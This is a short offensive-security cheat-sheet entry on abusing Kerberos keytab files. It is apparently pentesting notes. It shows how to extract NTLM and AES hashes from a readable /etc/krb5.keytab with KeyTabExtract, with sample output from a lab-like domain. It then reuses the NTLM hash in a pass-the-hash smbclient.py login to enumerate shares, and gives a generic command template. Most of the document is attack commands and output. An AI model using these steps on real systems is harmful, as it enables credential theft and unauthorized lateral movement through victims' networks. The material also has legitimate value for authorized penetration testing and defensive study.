**Keytabs Hacking**
A keytab is a file containing pairs of Kerberos principals and encrypted keys that are derived from the Kerberos password. 

### Example:
Imagine you find a **/etc/krb5.keytab** file that you have read access then you can do following:
1. Upload this on the victim to export the hashes: https://github.com/sosdave/KeyTabExtract
```
python3 keytabextract.py /etc/krb5.keytab
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : CORE.CYBER.LOCAL
	SERVICE PRINCIPAL : COREWEBDL$/
	NTLM HASH : 4182816cd42bdb6d20f7fb89703f5c48
	AES-256 HASH : e55623691c0e6b9aa833de108c382262f6af90cd77ecee5ff7f863d5e6405078
	AES-128 HASH : 520f11715eeb76fd9cbc8b0e08e387e1


```
2)Now use the NTLM hash to perform a share searching like
```
smbclient.py -hashes :4182816cd42bdb6d20f7fb89703f5c48 CORE.CYBER.LOCAL/'COREWEBDL$'@10.9.15.10
```
which is basically
```
smbclient.py -hashes :<NTLM HASH> <DOMAIN>/'<SERVICE PRINCIPAL$>'@<IP>
```